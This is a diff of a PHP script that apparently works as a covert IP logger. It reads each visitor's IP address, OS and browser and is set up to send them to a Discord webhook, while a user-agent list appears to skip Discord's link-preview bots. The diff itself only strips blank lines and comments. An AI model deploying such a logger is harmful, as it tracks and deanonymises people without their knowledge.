@@ -5,11 +5,9 @@ $webhookurl = "https://discord.com/api/webhooks/...";
 
 
 function getOS() { 
-
     global $user_agent;
 
     $os_platform    =   "Unknown OS Platform";
-
     $os_array       =   array(
                             '/windows nt 10/i'     =>  'Windows 10',
                             '/windows nt 6.3/i'     =>  'Windows 8.1',
@@ -39,21 +37,15 @@ function getOS() {
                         );
 
     foreach ($os_array as $regex => $value) { 
-
         if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
             $os_platform    =   $value;
         }
-
-    }   
-
+    }
     return $os_platform;
-
 }
 
 function getBrowser() {
-
     $browser        =   "Unknown Browser";
-
     $browser_array  =   array(
                             '/msie/i'       =>  'Internet Explorer',
                             '/firefox/i'    =>  'Firefox',
@@ -73,20 +65,12 @@ function getBrowser() {
                         );
 
     foreach ($browser_array as $regex => $value) { 
-
         if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
             $browser    =   $value;
         }
-
     }
-
     return $browser;
-
 }
-
-//=======================================================================================================
-// Create new webhook in your Discord channel settings and copy&paste URL
-//=======================================================================================================
 
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 $arr = array('DiscordBot', 'Discordbot', '+https://discordapp.com', 'electron', 'discord', 'Firefox/92.0');
@@ -103,11 +87,6 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 } else {
     $ipaddress = $_SERVER['REMOTE_ADDR'];
 }
-
-//=======================================================================================================
-// Compose message. You can use Markdown
-// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
-//========================================================================================================
 
 $timestamp = date("c", strtotime("now"));
 
